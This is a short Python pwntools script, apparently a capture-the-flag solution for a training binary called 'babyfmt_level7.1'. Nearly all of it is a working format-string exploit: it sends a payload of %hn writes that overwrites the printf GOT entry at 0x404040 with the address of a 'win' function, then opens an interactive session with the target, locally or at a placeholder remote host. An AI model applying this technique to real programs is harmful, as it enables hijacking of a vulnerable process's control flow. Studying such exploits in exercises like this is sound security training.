#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyfmt_level7.1")

context.binary = exe


gdb_script = """
b *func+266
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,gdb_script)
    else:
        r = remote("addr", 1337)

    return r



win_addr = 0x401351
printf_got = 0x404040


def main():
    r = conn()

    # good luck pwning :)
    payload = b"%42$hn%41$hn%64c%40$hn%4881c%39$hnAAAAAA" + p64(0x404040) + p64(0x404042) + p64(0x404044) + p64(0x404046)
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
